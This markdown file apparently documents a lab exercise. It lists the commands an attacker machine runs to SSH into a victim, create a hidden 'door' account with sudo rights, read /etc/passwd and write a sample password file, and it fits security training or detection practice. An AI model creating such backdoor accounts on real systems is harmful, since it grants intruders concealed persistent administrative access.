# Attacker Actions

This file documents the commands executed from the attacker's Kali Linux machine.

---

## Connect via SSH

```bash
ssh Omar@192.168.81.129
```

Logs into the victim machine using SSH.

---

## Verify Sudo Permissions

```bash
sudo -l
```

Displays the sudo privileges available to Omar.

---

## Create Backdoor User

```bash
sudo useradd -m door
```

Creates a hidden user named **door**.

---

## Set Password

```bash
sudo passwd door
```

Assigns a password to the new account.

---

## Grant Sudo Privileges

```bash
sudo usermod -aG sudo door
```

Adds the door account to the sudo group.

---

## Verify User Information

```bash
id door
```

Displays the UID, GID, and group memberships.

---

## Switch to Door Account

```bash
su - door
```

Changes the current session to the door account.

---

## Verify Door Privileges

```bash
sudo -l
```

Confirms that door has administrative privileges.

---

## List Home Directory

```bash
ls -la
```

Displays all files, including hidden ones.

---

## View Local Users

```bash
cat /etc/passwd
```

Displays all local user accounts.

---

## Create Password File

```bash
touch mypasswords.txt
```

Creates a sample text file.

---

## Store Sample Passwords

```bash
echo "1111,2222,3333,abc" > mypasswords.txt
```

Writes example passwords into the file.

---

## Exit Sessions

```bash
exit
exit
```

Closes the door session and terminates the SSH connection.
